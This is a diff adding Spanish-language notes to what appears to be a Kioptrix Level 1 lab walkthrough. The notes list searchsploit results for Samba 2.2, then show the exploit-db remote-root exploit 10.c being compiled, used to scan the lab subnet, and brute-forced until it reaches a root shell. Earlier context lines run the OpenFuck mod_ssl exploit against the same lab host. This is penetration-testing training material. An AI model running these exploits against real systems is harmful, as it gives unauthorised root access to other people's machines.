@@ -67,3 +67,51 @@ searchsploit openfuck
 apt-get install libssl-dev
 gcc -o OpenFuck 47080.c -lcrypto
 ./OpenFuck 0x6b 192.168.111.129 443 -c 40
+Y ya somos root
+
+smbclient --list 192.168.111.129
+  En mi caso no arrojaba nada, pero en writeups decía que es Samba 2.2 así que parto de esa premisa
+searchsploit samba 2.2
+  Samba 2.0.x/2.2 - Arbitrary File Creation                                                                                                                                                         | exploits/unix/remote/20968.txt
+  Samba 2.2.0 < 2.2.8 (OSX) - trans2open Overflow (Metasploit)                                                                                                                                      | exploits/osx/remote/9924.rb
+  Samba 2.2.2 < 2.2.6 - 'nttrans' Remote Buffer Overflow (Metasploit) (1)                                                                                                                           | exploits/linux/remote/16321.rb
+  Samba 2.2.8 (BSD x86) - 'trans2open' Remote Overflow (Metasploit)                                                                                                                                 | exploits/bsd_x86/remote/16880.rb
+  Samba 2.2.8 (Linux Kernel 2.6 / Debian / Mandrake) - Share Privilege Escalation                                                                                                                   | exploits/linux/local/23674.txt
+  Samba 2.2.8 (Linux x86) - 'trans2open' Remote Overflow (Metasploit)                                                                                                                               | exploits/linux_x86/remote/16861.rb
+  Samba 2.2.8 (OSX/PPC) - 'trans2open' Remote Overflow (Metasploit)                                                                                                                                 | exploits/osx_ppc/remote/16876.rb
+  Samba 2.2.8 (Solaris SPARC) - 'trans2open' Remote Overflow (Metasploit)                                                                                                                           | exploits/solaris_sparc/remote/16330.rb
+  Samba 2.2.8 - Brute Force Method Remote Command Execution                                                                                                                                         | exploits/linux/remote/55.c
+  Samba 2.2.x - 'call_trans2open' Remote Buffer Overflow (1)                                                                                                                                        | exploits/unix/remote/22468.c
+  Samba 2.2.x - 'call_trans2open' Remote Buffer Overflow (2)                                                                                                                                        | exploits/unix/remote/22469.c
+  Samba 2.2.x - 'call_trans2open' Remote Buffer Overflow (3)                                                                                                                                        | exploits/unix/remote/22470.c
+  Samba 2.2.x - 'call_trans2open' Remote Buffer Overflow (4)                                                                                                                                        | exploits/unix/remote/22471.txt
+  Samba 2.2.x - 'nttrans' Remote Overflow (Metasploit)                                                                                                                                              | exploits/linux/remote/9936.rb
+  Samba 2.2.x - CIFS/9000 Server A.01.x Packet Assembling Buffer Overflow                                                                                                                           | exploits/unix/remote/22356.c
+  Samba 2.2.x - Remote Buffer Overflow                                                                                                                                                              | exploits/linux/remote/7.pl
+  Samba < 2.2.8 (Linux/BSD) - Remote Code Execution                                                                                                                                                 | exploits/multiple/remote/10.c
+
+cp /usr/share/exploitdb/exploits/multiple/remote/10.c ./
+gcc -o sambaEx 10.c
+./sambaEx -S 192.168.111
+  samba-2.2.8 < remote root exploit by eSDee (www.netric.org|be)
+  --------------------------------------------------------------
+  + Scan mode.
+  + [192.168.111.1] Windows
+  + [192.168.111.129] Samba
+
+./sambaEx -b 0 -v 192.168.111.129
+  samba-2.2.8 < remote root exploit by eSDee (www.netric.org|be)
+  --------------------------------------------------------------
+  + Verbose mode.
+  + Bruteforce mode. (Linux)
+  + Host is running samba.
+  + Using ret: [0xbffffed4]
+  + Using ret: [0xbffffda8]
+  + Using ret: [0xbffffc7c]
+  + Worked!
+  --------------------------------------------------------------
+  *** JE MOET JE MUIL HOUWE
+  Linux kioptrix.level1 2.4.7-10 #1 Thu Sep 6 16:46:36 EDT 2001 i686 unknown
+  uid=0(root) gid=0(root) groups=99(nobody)
+ 
+ Y ya somos root
